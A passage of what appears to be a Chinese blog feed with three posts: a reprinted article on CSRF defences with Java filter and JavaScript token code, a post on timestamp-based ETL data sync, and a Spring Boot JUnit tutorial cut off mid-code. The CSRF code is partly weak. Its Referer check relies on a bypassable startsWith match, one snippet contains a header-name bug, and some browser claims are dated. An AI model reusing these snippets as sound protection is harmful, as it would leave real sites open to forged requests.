以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成<code>http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”hidden”</span> <span class="attr">name</span>=<span class="string">”csrftoken”</span> <span class="attr">value</span>=<span class="string">”tokenvalue”/</span>&gt;</span></span><br></pre></td></tr></table></figure><p>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p><h3 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h3><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h2 id="Java-代码示例"><a href="#Java-代码示例" class="headerlink" title="Java 代码示例"></a>Java 代码示例</h2><p>下文将以 Java 为例，对上述三种方法分别用代码进行示例。无论使用何种方法，在服务器端的拦截器必不可少，它将负责检查到来的请求是否符合要求，然后视结果而决定是否继续请求或者丢弃。在 Java 中，拦截器是由 Filter 来实现的。我们可以编写一个 Filter，并在 web.xml 中对其进行配置，使其对于访问所有需要 CSRF 保护的资源的请求进行拦截。</p><p>在 filter 中对请求的 Referer 验证代码如下<br>清单 1. 在 Filter 中验证 Referer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpServletRequest req = (HttpServletRequest)request; </span><br><span class="line"><span class="comment">// 从 HTTP 头中取得 Referer 值</span></span><br><span class="line">String referer=req.getHeader(<span class="string">"Referer"</span>); </span><br><span class="line"><span class="comment">// 判断 Referer 是否以 bank.example 开头</span></span><br><span class="line"><span class="keyword">if</span>((referer!=<span class="keyword">null</span>) &amp;&amp;(referer.trim().startsWith(“bank.example”)))&#123; </span><br><span class="line">   chain.doFilter(request, response); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  String servletPath = req.getServletPath();<span class="comment">//当前请求url，去掉几个可以直接访问的页面</span></span><br><span class="line">  <span class="keyword">if</span>(servletPath.contains(<span class="string">"index.jsp"</span>) || servletPath.contains(<span class="string">"admin/login.jsp"</span>))&#123; <span class="comment">//跳过index.jsp和登陆Login.jsp</span></span><br><span class="line">   chain.doFilter(request, response);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">   request.getRequestDispatcher(“error.jsp”).forward(request,response); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码先取得 Referer 值，然后进行判断，当其非空并以 bank.example 开头时，则继续请求，否则的话可能是 CSRF 攻击，转到 error.jsp 页面。</p><p>如果要进一步验证请求中的 token 值，代码如下<br>清单 2. 在 filter 中验证请求中的 token</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpServletRequest req = (HttpServletRequest)request; </span><br><span class="line">HttpSession s = req.getSession(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 session 中得到 csrftoken 属性</span></span><br><span class="line">String sToken = (String)s.getAttribute(“csrftoken”); </span><br><span class="line"><span class="keyword">if</span>(sToken == <span class="keyword">null</span>)&#123; </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 产生新的 token 放入 session 中</span></span><br><span class="line">   sToken = generateToken(); </span><br><span class="line">   s.setAttribute(“csrftoken”,sToken); </span><br><span class="line">   chain.doFilter(request, response); </span><br><span class="line">&#125; <span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 从 HTTP 头中取得 csrftoken </span></span><br><span class="line">   String xhrToken = req.getHeader(“csrftoken”); </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 从请求参数中取得 csrftoken </span></span><br><span class="line">   String pToken = req.getParameter(“csrftoken”); </span><br><span class="line">   <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; xhrToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(xhrToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; pToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(pToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">       request.getRequestDispatcher(“error.jsp”).forward(request,response); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断 session 中有没有 csrftoken，如果没有，则认为是第一次访问，session 是新建立的，这时生成一个新的 token，放于 session 之中，并继续执行请求。如果 session 中已经有 csrftoken，则说明用户已经与服务器之间建立了一个活跃的 session，这时要看这个请求中有没有同时附带这个 token，由于请求可能来自于常规的访问或是 XMLHttpRequest 异步访问，我们分别尝试从请求中获取 csrftoken 参数以及从 HTTP 头中获取 csrftoken 自定义属性并与 session 中的值进行比较，只要有一个地方带有有效 token，就判定请求合法，可以继续执行，否则就转到错误页面。生成 token 有很多种方法，任何的随机算法都可以使用，Java 的 UUID 类也是一个不错的选择。</p><p>除了在服务器端利用 filter 来验证 token 的值以外，我们还需要在客户端给每个请求附加上这个 token，这是利用 js 来给 html 中的链接和表单请求地址附加 csrftoken 代码，其中已定义 token 为全局变量，其值可以从 session 中得到。<br>清单 3. 在客户端对于请求附加 token</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">appendToken</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">   updateForms(); </span><br><span class="line">   updateTags(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateForms</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="comment">// 得到页面中所有的 form 元素</span></span><br><span class="line">   <span class="keyword">var</span> forms = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>); </span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;forms.length; i++) &#123; </span><br><span class="line">       <span class="keyword">var</span> url = forms[i].action; </span><br><span class="line"></span><br><span class="line">       <span class="comment">// 如果这个 form 的 action 值为空，则不附加 csrftoken </span></span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span> || url == <span class="string">""</span> ) <span class="keyword">continue</span>; </span><br><span class="line"></span><br><span class="line">       <span class="comment">// 动态生成 input 元素，加入到 form 之后</span></span><br><span class="line">       <span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>); </span><br><span class="line">       e.name = <span class="string">"csrftoken"</span>; </span><br><span class="line">       e.value = token; </span><br><span class="line">       e.type=<span class="string">"hidden"</span>; </span><br><span class="line">       forms[i].appendChild(e); </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateTags</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> all = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>); </span><br><span class="line">   <span class="keyword">var</span> len = all.length; </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 遍历所有 a 元素</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++) &#123; </span><br><span class="line">       <span class="keyword">var</span> e = all[i]; </span><br><span class="line">       updateTag(e, <span class="string">'href'</span>, token); </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateTag</span>(<span class="params">element, attr, token</span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> location = element.getAttribute(attr); </span><br><span class="line">   <span class="keyword">if</span>(location != <span class="literal">null</span> &amp;&amp; location != <span class="string">''</span> <span class="string">''</span> ) &#123; </span><br><span class="line">       <span class="keyword">var</span> fragmentIndex = location.indexOf(<span class="string">'#'</span>); </span><br><span class="line">       <span class="keyword">var</span> fragment = <span class="literal">null</span>; </span><br><span class="line">       <span class="keyword">if</span>(fragmentIndex != <span class="number">-1</span>)&#123; </span><br><span class="line"></span><br><span class="line">           <span class="comment">//url 中含有只相当页的锚标记</span></span><br><span class="line">           fragment = location.substring(fragmentIndex); </span><br><span class="line">           location = location.substring(<span class="number">0</span>,fragmentIndex); </span><br><span class="line">       &#125; </span><br><span class="line">	</span><br><span class="line">       <span class="keyword">var</span> index = location.indexOf(<span class="string">'?'</span>); </span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(index != <span class="number">-1</span>) &#123; </span><br><span class="line">           <span class="comment">//url 中已含有其他参数</span></span><br><span class="line">           location = location + <span class="string">'&amp;csrftoken='</span> + token; </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">           <span class="comment">//url 中没有其他参数</span></span><br><span class="line">           location = location + <span class="string">'?csrftoken='</span> + token; </span><br><span class="line">       &#125; </span><br><span class="line">       <span class="keyword">if</span>(fragment != <span class="literal">null</span>)&#123; </span><br><span class="line">           location += fragment; </span><br><span class="line">       &#125; </span><br><span class="line">	</span><br><span class="line">       element.setAttribute(attr, location); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在客户端 html 中，主要是有两个地方需要加上 token，一个是表单 form，另一个就是链接 a。这段代码首先遍历所有的 form，在 form 最后添加一隐藏字段，把 csrftoken 放入其中。然后，代码遍历所有的链接标记 a，在其 href 属性中加入 csrftoken 参数。注意对于 a.href 来说，可能该属性已经有参数，或者有锚标记。因此需要分情况讨论，以不同的格式把 csrftoken 加入其中。</p><p>如果你的网站使用 XMLHttpRequest，那么还需要在 HTTP 头中自定义 csrftoken 属性，利用 dojo.xhr 给 XMLHttpRequest 加上自定义属性代码如下：<br>清单 4. 在 HTTP 头中自定义属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plainXhr = dojo.xhr; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写 dojo.xhr 方法</span></span><br><span class="line">dojo.xhr = <span class="function"><span class="keyword">function</span>(<span class="params">method,args,hasBody</span>) </span>&#123; </span><br><span class="line">   <span class="comment">// 确保 header 对象存在</span></span><br><span class="line">   args.headers = args.header || &#123;&#125;; </span><br><span class="line">	</span><br><span class="line">   tokenValue = <span class="string">'&lt;%=request.getSession(false).getAttribute("csrftoken")%&gt;'</span>; </span><br><span class="line">   <span class="keyword">var</span> token = dojo.getObject(<span class="string">"tokenValue"</span>); </span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 把 csrftoken 属性放到头中</span></span><br><span class="line">   args.headers[<span class="string">"csrftoken"</span>] = (token) ? token : <span class="string">"  "</span>; </span><br><span class="line">   <span class="keyword">return</span> plainXhr(method,args,hasBody); </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里改写了 dojo.xhr 的方法，首先确保 dojo.xhr 中存在 HTTP 头，然后在 args.headers 中添加 csrftoken 字段，并把 token 值从 session 里拿出放入字段中。</p><h2 id="CSRF-防御方法选择之道"><a href="#CSRF-防御方法选择之道" class="headerlink" title="CSRF 防御方法选择之道"></a>CSRF 防御方法选择之道</h2><p>通过上文讨论可知，目前业界应对 CSRF 攻击有一些克制方法，但是每种方法都有利弊，没有一种方法是完美的。如何选择合适的方法非常重要。如果网站是一个现有系统，想要在最短时间内获得一定程度的 CSRF 的保护，那么验证 Referer 的方法是最方便的，要想增加安全性的话，可以选择不支持低版本浏览器，毕竟就目前来说，IE7+, FF3+ 这类高版本浏览器的 Referer 值还无法被篡改。</p><p>如果系统必须支持 IE6，并且仍然需要高安全性。那么就要使用 token 来进行验证，在大部分情况下，使用 XmlHttpRequest 并不合适，token 只能以参数的形式放于请求之中，若你的系统不支持用户自己发布信息，那这种程度的防护已经足够，否则的话，你仍然难以防范 token 被黑客窃取并发动攻击。在这种情况下，你需要小心规划你网站提供的各种服务，从中间找出那些允许用户自己发布信息的部分，把它们与其他服务分开，使用不同的 token 进行保护，这样可以有效抵御黑客对于你关键服务的攻击，把危害降到最低。毕竟，删除别人一个帖子比直接从别人账号中转走大笔存款严重程度要轻的多。</p><p>如果是开发一个全新的系统，则抵御 CSRF 的选择要大得多。笔者建议对于重要的服务，可以尽量使用 XMLHttpRequest 来访问，这样增加 token 要容易很多。另外尽量避免在 js 代码中使用复杂逻辑来构造常规的同步请求来访问需要 CSRF 保护的资源，比如 window.location 和 document.createElement(“a”) 之类，这样也可以减少在附加 token 时产生的不必要的麻烦。</p><p>最后，要记住 CSRF 不是黑客唯一的攻击手段，无论你 CSRF 防范有多么严密，如果你系统有其他安全漏洞，比如跨站域脚本攻击 XSS，那么黑客就可以绕过你的安全防护，展开包括 CSRF 在内的各种攻击，你的防线将如同虚设。</p><h2 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h2><p>可见，CSRF 是一种危害非常大的攻击，又很难以防范。目前几种防御策略虽然可以很大程度上抵御 CSRF 的攻击，但并没有一种完美的解决方案。一些新的方案正在研究之中，比如对于每次请求都使用不同的动态口令，把 Referer 和 token 方案结合起来，甚至尝试修改 HTTP 规范，但是这些新的方案尚不成熟，要正式投入使用并被业界广为接受还需时日。在这之前，我们只有充分重视 CSRF，根据系统的实际情况选择最合适的策略，这样才能把 CSRF 的危害降到最低。<br><a href="http://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title>高性能、最终一致性的数据同步方案</title>
    <url>/2016/05/03/something-about-etl/</url>
    <content><![CDATA[<h2 id="问题的来源"><a href="#问题的来源" class="headerlink" title="问题的来源"></a>问题的来源</h2><p>先描述一下问题：</p><p>两个系统的数据需要做数据同步，可以是数据库到数据库，也可以是数据库到内存。要求高性能（速度快），最终一致性（数据不能错）。</p><a id="more"></a><h2 id="利用-Job-来定时同步数据"><a href="#利用-Job-来定时同步数据" class="headerlink" title="利用 Job 来定时同步数据"></a>利用 Job 来定时同步数据</h2><p>首先，如果是中小型系统，可以接受秒级别的延时，数据变更频率不是非常高的话，可以用这个方案。</p><p>常见的场景有：后台系统用户数据，后台系统角色、组织架构数据。</p><h3 id="Job-处理过程"><a href="#Job-处理过程" class="headerlink" title="Job 处理过程"></a>Job 处理过程</h3><p>那 Job 的数据逻辑是怎么样的呢？</p><p>查询数据 -&gt; 可能需要做一些转换 -&gt; 然后插入数据</p><p>看上去好简单的样子，但是如何查询数据会是一个挑战。因为假如你的表很大，而实际每分钟只会变更几条，难道你每次都要全量同步一边？</p><p>如何识别出那些变过的数据呢？</p><h3 id="为你的数据加上-UpdateTime-字段"><a href="#为你的数据加上-UpdateTime-字段" class="headerlink" title="为你的数据加上 UpdateTime 字段"></a>为你的数据加上 UpdateTime 字段</h3><p>为了解决这个问题，需要对你的数据库表进行一定的改造。其实，所有的数据库表都应该这么设计。</p><p>第一个要改造的点是加上一个<code>UpdateTime</code>字段，每次更新数据的时候都需要去更新这个字段。</p><p>如果用的是 MySQL 的话，可以直接把这个字段定义成这样子：</p><p><code>UpdateTime timestamp NOT NULL default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP</code></p><p>这样设置以后，每次数据变更 MySQL 会自动更新这个字段。另外，如果你进行了<code>Update</code>操作而数据其实没变，那么这个字段不会更新，非常贴心。</p><p>这个是为了解决什么问题？</p><p>我必须要知道所有数据的变更时间，我才能找到那些新插入或者新更新的数据。所以加上这个字段后，<code>Insert</code>和<code>Update</code>的问题就解决了，但是还有<code>Delete</code>！</p><h3 id="为你的数据加上-IsDeleted-字段"><a href="#为你的数据加上-IsDeleted-字段" class="headerlink" title="为你的数据加上 IsDeleted 字段"></a>为你的数据加上 IsDeleted 字段</h3><p>你还在直接删除数据？如果是的话，赶紧改改吧，因为这么做在 ETL 系统中非常不友好。源表中的数据都删了，那 Job 还怎么找到它？难道要做两遍的数据比对？这个又要全表扫描目标表了。性能会非常差。</p><p>所以最简单的方案就是加上<code>IsDeleted</code>字段进行软删除，这样删除的数据其实就是<code>Update</code>了一下，处理起来就非常简单了。</p><p>如果你的系统在设计之初就用了软删除，那么你会轻松很多，如果不是，那么就需要修改你的程序了。</p><p>相信我，越早改越好！除非你的系统永远那么小…</p><h3 id="选择合适的时间"><a href="#选择合适的时间" class="headerlink" title="选择合适的时间"></a>选择合适的时间</h3><p>下面一个问题才是真正头疼的地方。我们也用过很多现成的 ETL 系统来同步数据了，源表也加上了上面提到的两个字段来识别有变更的数据。</p><p>假设作业5分钟跑一次，那怎么写 SQL 语句呢？</p><p><code>SELECT * FROM User WHERE UpdateTime &gt;= DATE_SUB(Now(),INTERVAL 5 MINUTE)</code></p><p>这么写有什么缺点呢？第一个缺点就是，你没办法保证你的 Job 真的是5分钟运行一次的，如果是5分01秒呢？那多出来的1秒的数据就丢了。</p><p>另外，如果你 Job 所在机器的时间和数据库的时间不一致呢？极端情况假设你的 Job 机器快了10分钟，那么 Job 就永远取不到数据了。别以为这种情况不会发生…</p><p>这个方案直接被拍死，那么下一个方案：</p><p><code>SELECT * FROM User WHERE UpdateTime &gt;= #LastRunTime#</code></p><p>这里需要加入一个<code>LastRunTime</code>变量，直接变量由 Job 程序自己记录。加上这个变量后，就解决了 Job 没办法准确地5分钟跑一次的问题。</p><p>但是机器时间不一致的问题解决了吗？好像还没有…</p><p>那来一个终极完美的方案吧：</p><p><code>SELECT * FROM User WHERE UpdateTime &gt;= #LastRowTime#</code></p><p>这里的<code>LastRowTime</code>是什么含义呢？它是你上次取到数据的最新一条。恩，这样就完全不依赖 Job 所在机器的时间了。哪怕它们相隔几年，数据也不会丢。因为你用的是相对时间。</p><p>那为什么是<code>&gt;=</code>而不是<code>&gt;</code>呢？</p><p>极端情况下，假设在同一个时间插入两条数据，它们的<code>LastUpdateTime</code>是一样的。而你取数据的时候，只插入了第一条，取完了才插入第二条。如果你后面查询的时候用<code>&gt;</code>，这个这里第二条数据就丢掉了。</p><p>最后，还有一个折中方案，因为很多现成的 ETL 系统没办法记录<code>LastRowTime</code>，只能记录<code>LastRunTime</code>，那么可以这么写：</p><p><code>SELECT * FROM User WHERE UpdateTime &gt;= DATE_SUB(#LastRunTime#,INTERVAL 10 MINUTE)</code></p><p>这里我们可以接受两台机器有时间差，但是最多十分钟，这样做也会有缺点，每次都会有一些数据重复同步。</p><p>或者，你的 ETL 系统连<code>LastRunTime</code>都没有（那还算是一个合格的 ETL 系统吗？），那么只能这样了，每五分钟同步一次：</p><p><code>SELECT * FROM User WHERE UpdateTime &gt;= DATE_SUB(NOW(),INTERVAL 10 MINUTE)</code></p><h2 id="利用阿里巴巴开源组件-canal"><a href="#利用阿里巴巴开源组件-canal" class="headerlink" title="利用阿里巴巴开源组件 canal"></a>利用阿里巴巴开源组件 canal</h2><p>上面的方案虽说只支持中小型系统，但是你们的数据库表真的会有频繁变更吗？如果没有，那么上面的方案一直是适用的。</p><p>但是如果你们系统的更新真的非常频繁，而且你们要接近实时的同步效率那怎么办？</p><p>如果有这样需求的话，建议尝试看看阿里巴巴的<code>canal</code>，项目地址在这里：<a href="https://github.com/alibaba/canal">https://github.com/alibaba/canal</a></p><p><a href="http://www.dozer.cc/2015/03/etl.html">原文链接</a></p><h2 id="Kettle数据同步"><a href="#Kettle数据同步" class="headerlink" title="Kettle数据同步"></a>Kettle数据同步</h2><p><a href="http://community.pentaho.com/projects/data-integration/">Kettle</a>是一款国外开源的ETL工具，数据抽取高效稳定。<br>1.数据同步方法<br>根据需求不同我们可以采取以下方案。<br>1.1触发器：在数据库建立增删改的触发器。触发器将变更放到一张临时表里。<br>优点：实时同步<br>缺点：影响到业务系统，因为需要在业务系统建立触发器<br>1.2日志：通过分析源数据库日志，来获得源数据库中的变化的数据。<br>优点：不影响业务系统<br>缺点：有一定得延时，对于没有提供日志分析接口的数据源，开发的难度比较大<br>1.3时间戳：在要同步的源表里有时间戳字段，每当数据发生变化，时间戳会记录发生变化的时间<br>优点：基本不影响业务系统<br>缺点：要求源表必须有时间戳这一列<br>1.4数据比较：通过比较两边数据源数据，来完成数据同步。一般用于实时性要求不高的场景。<br>优点：基本不影响业务系统<br>缺点：效率低<br>1.5全表拷贝：定时清空目的数据源，将源数据源的数据全盘拷贝到目的数据源。一般用于数据量不大，实时性要求不高的场景。<br>优点：基本不影响业务系统，开发、部署都很简单<br>缺点：效率低</p><p><a href="http://blog.yaodataking.com/2016/03/kettle-synchronize.html">Kettle数据同步初探</a></p>]]></content>
  </entry>
  <entry>
    <title>spring boot junit</title>
    <url>/2016/05/04/spring-boot-junit/</url>
    <content><![CDATA[<p>Spring boot 使用JUnit测试，可以导入测试相关包spring-boot-starter-test，pom文件中添加如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;version&gt;$&#123;spring.boot.version&#125;&lt;/version&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用JUnit"><a href="#使用JUnit" class="headerlink" title="使用JUnit"></a>使用JUnit</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="class">.<span class="keyword">class</span>) // <span class="title">SpringJUnit</span>支持，由此引入<span class="title">Spring</span>-<span class="title">Test</span>框架支持！ </span></span><br><span class="line"><span class="class">@<span class="title">SpringApplicationConfiguration</span>(<span class="title">classes</span> </span>= App<span class="class">.<span class="keyword">class</span>) // 指定我们<span class="title">SpringBoot</span>工程的<span class="title">Application</span>启动类</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">//<span class="title">Web</span>项目加如下注解</span></span><br><span class="line"><span class="class">@<span class="title">WebAppConfiguration</span> // 由于是<span class="title">Web</span>项目，<span class="title">Junit</span>需要模拟<span class="title">ServletContext</span>，因此我们需要给我们的测试类加上@<span class="title">WebAppConfiguration</span>。</span></span><br></pre></td></tr></table></figure><h3 id="基本JUnit注解"><a href="#基本JUnit注解" class="headerlink" title="基本JUnit注解"></a>基本JUnit注解</h3><pre><code>1. @BeforeClass
//在所有测试方法前执行一次，一般在其中写上整体初始化的代码 

2. @AfterClass
//在所有测试方法后执行一次，一般在其中写上销毁和释放资源的代码 

3. @Before
//在每个测试方法前执行，一般用来初始化方法（比如我们在测试别的方法时，类中与其他测试方法共享的值已经被改变，为了保证测试结果的有效性，我们会在@Before注解的方法中重置数据）

4. @After
//在每个测试方法后执行，在方法执行完成后要做的事情 

5. @Test(timeout = 1000)
// 测试方法执行超过1000毫秒后算超时，测试将失败 

6. @Test(expected = Exception.class)
// 测试方法期望得到的异常类，如果方法执行没有抛出指定的异常，则测试失败 

7. @Ignore(“not ready yet”) 
   @Test
// 执行测试时将忽略掉此方法，如果用于修饰类，则忽略整个类 

8. @RunWith 
在JUnit中有很多个Runner，他们负责调用你的测试代码，每一个Runner都有各自的特殊功能，你要根据需要选择不同的Runner来运行你的测试代码。 
如果我们只是简单的做普通Java测试，不涉及Spring Web项目，你可以省略@RunWith注解，这样系统会自动使用默认Runner来运行你的代码。</code></pre><h3 id="参数化测试"><a href="#参数化测试" class="headerlink" title="参数化测试"></a>参数化测试</h3><pre><code>@RunWith(Parameterized.class)注解类，@Parameters注解方法。</code></pre><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Parameters</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Collection&lt;?&gt; data()&#123;</span><br><span class="line">    <span class="comment">// Object 数组中值的顺序注意要和上面的构造方法ParameterTest的参数对应</span></span><br><span class="line">    <span class="keyword">return</span> Arrays.asList(<span class="keyword">new</span> Object[][]&#123;</span><br><span class="line">        &#123;<span class="string">"小明2"</span>, <span class="keyword">true</span>&#125;,</span><br><span class="line">        &#123;<span class="string">"坏"</span>, <span class="keyword">false</span>&#125;,</span><br><span class="line">        &#123;<span class="string">"莉莉"</span>, <span class="keyword">false</span>&#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="套件测试"><a href="#套件测试" class="headerlink" title="套件测试"></a>套件测试</h3><pre><code>@RunWith(Suite.class) 
@SuiteClasses({ATest.class, BTest.class, CTest.class}) </code></pre><h3 id="使用Junit测试HTTP的API接口"><a href="#使用Junit测试HTTP的API接口" class="headerlink" title="使用Junit测试HTTP的API接口"></a>使用Junit测试HTTP的API接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">SpringApplicationConfiguration</span>(<span class="title">classes</span> </span>= SpringBootSampleApplication<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">//@<span class="title">WebAppConfiguration</span> // 使用@<span class="title">WebIntegrationTest</span>注解需要将@<span class="title">WebAppConfiguration</span>注释掉</span></span><br><span class="line">@WebIntegrationTest("server.port:0")// 使用0表示端口号随机，也可以具体指定如8888这样的固定端口</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloControllerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String dateReg;</span><br><span class="line">    <span class="keyword">private</span> Pattern pattern;</span><br><span class="line">    <span class="keyword">private</span> RestTemplate template = <span class="keyword">new</span> TestRestTemplate();</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;local.server.port&#125;"</span>)<span class="comment">// 注入端口号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String url = <span class="string">"http://localhost:"</span>+port+<span class="string">"/myspringboot/hello/info"</span>;</span><br><span class="line">        MultiValueMap&lt;String, Object&gt; map = <span class="keyword">new</span> LinkedMultiValueMap&lt;String, Object&gt;(); </span><br><span class="line">        map.add(<span class="string">"name"</span>, <span class="string">"Tom"</span>);  </span><br><span class="line">        map.add(<span class="string">"name1"</span>, <span class="string">"Lily"</span>);</span><br><span class="line">        String result = template.postForObject(url, map, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        assertNotNull(result);</span><br><span class="line">        assertThat(result, Matchers.containsString(<span class="string">"Tom"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="捕获输出"><a href="#捕获输出" class="headerlink" title="捕获输出"></a>捕获输出</h3><p>使用 OutputCapture 来捕获指定方法开始执行以后的所有输出，包括System.out输出和Log日志。<br>OutputCapture 需要使用@Rule注解，并且实例化的对象需要使用public修饰，如下代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">SpringApplicationConfiguration</span>(<span class="title">classes</span> </span>= SpringBootSampleApplication<span class="class">.<span 